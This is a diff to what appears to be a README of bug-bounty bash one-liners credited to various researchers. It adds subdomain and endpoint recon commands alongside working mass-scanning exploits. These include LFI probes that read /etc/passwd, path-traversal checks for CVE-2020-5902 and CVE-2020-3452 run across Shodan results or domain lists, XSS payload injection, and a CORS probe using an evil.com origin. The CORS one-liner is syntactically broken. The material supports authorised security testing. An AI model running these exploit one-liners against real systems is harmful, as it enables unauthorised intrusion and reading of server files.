@@ -9,7 +9,7 @@ This repository stores and houses various one-liner for bug bounty tips provided
 > @dwisiswant0
 
 ```bash
-gau $1 | gf lfi | qsreplace "/etc/passwd" | xargs -I % -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
 ```
 
 ### Open-redirect
@@ -23,7 +23,7 @@ export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xar
 > @cihanmehmet
 
 ```bash
-gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
+gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee result.txt
 ```
 
 ### CVE-2020-5902
@@ -31,6 +31,12 @@ gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff
 
 ```bash
 shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
+```
+
+### CVE-2020-3452
+> @vict0ni
+```bash
+while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domain_list.txt
 ```
 
 ### vBulletin 5.6.2 - 'widget_tabbedContainer_tab_panel' Remote Code Execution
@@ -105,7 +111,11 @@ curl -s "http://web.archive.org/cdx/search/cdx?url=*.domain.com/*&output=text&fl
 ```bash
 curl -s "https://jldc.me/anubis/subdomains/domain.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
 ```
-
+### Get Subdomains from securitytrails
+> @pikpikcu
+```bash
+curl -s "https://securitytrails.com/list/apex_domain/domain.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".domain.com" | sort -u
+```
 ### Get Subdomains from crt.sh
 > @vict0ni
 
@@ -118,6 +128,13 @@ curl -s "https://crt.sh/?q=%25.$1&output=json" | jq -r '.[].name_value' | sed 's
 
 ```bash
 curl "https://recon.dev/api/search?key=apikey&domain=example.com" |jq -r '.[].rawDomains[]' | sed 's/ //g' | sort -u |httpx -silent
+```
+
+### Subdomain Bruteforcer with FFUF
+> @GochaOqradze
+
+```bash
+ffuf -u https://FUZZ.rootdomain -w jhaddixall.txt -v | grep "| URL |" | awk '{print $4}'
 ```
 
 ### Find All Allocated IP ranges for ASN given an IP address
@@ -180,6 +197,13 @@ cat domains | xargs -I % python3 ~/tool/ParamSpider/paramspider.py -l high -o ./
 cat alive-subdomains.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
 ```
 
+### Dump In-scope Assets from `chaos-bugbounty-list`
+> @dwisiswant0
+
+```bash
+curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r '.programs[].domains | to_entries | .[].value'
+```
+
 ### Dump In-scope Assets from `bounty-targets-data`
 > @dwisiswant0
 
@@ -224,4 +248,88 @@ curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/federac
 
 ```bash
 curl -s domain.com/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'
+```
+
+### Pure bash Linkfinder
+> @ntrzz
+
+```bash
+curl -s $1 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort | uniq | grep ".js" > jslinks.txt; while IFS= read link; do python linkfinder.py -i "$link" -o cli; done < jslinks.txt | grep $2 | grep -v $3 | sort -n | uniq; rm -rf jslinks.txt
+```
+
+### Extract Endpoints from swagger.json
+> @zer0pwn
+
+```bash
+curl -s https://domain.tld/v2/swagger.json | jq '.paths | keys[]'
+```
+
+### CORS Misconfiguration
+> @manas_hunter
+
+```bash
+site="https://example.com"; gau "$site" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
+```
+
+### Find Hidden Servers and/or Admin Panels
+> @rez0__
+
+```bash
+ffuf -c -u https://target .com -H "Host: FUZZ" -w vhost_wordlist.txt 
+```
+
+### Recon using api.recon.dev
+> @z0idsec
+
+```bash
+curl -s -w "\n%{http_code}" https://api.recon.dev/search?domain=site.com | jg .[].domain
+```
+
+### Find live host/domain/assets
+> @_YashGoti_
+
+```bash
+subfinder -d http://tesla.com -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u
+```
+
+### XSS without gf
+> @HacktifyS
+
+```bash
+waybackurls testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
+```
+
+### Extract endpoints from APK files
+> @laughface809
+
+```bash
+apkurlgrep -a path/to/file.apk
+```
+
+### Get Subdomains from IPs
+> @laughface809
+
+```bash
+python3 hosthunter.py <target-ips.txt> > vhosts.txt
+```
+
+### webscreenshot
+> @laughface809
+
+```bash
+python webscreenshot.py -i list.txt -w 40
+```
+
+### Removes duplicate URLs and parameter combinations
+> @laughface809
+
+```bash
+cat urls.txt |qsreplace -a
+```
+
+### Gather domains from content-security-policy:
+> @geeknik
+
+```bash
+curl -v -silent https://$domain --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" |  sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u
 ```
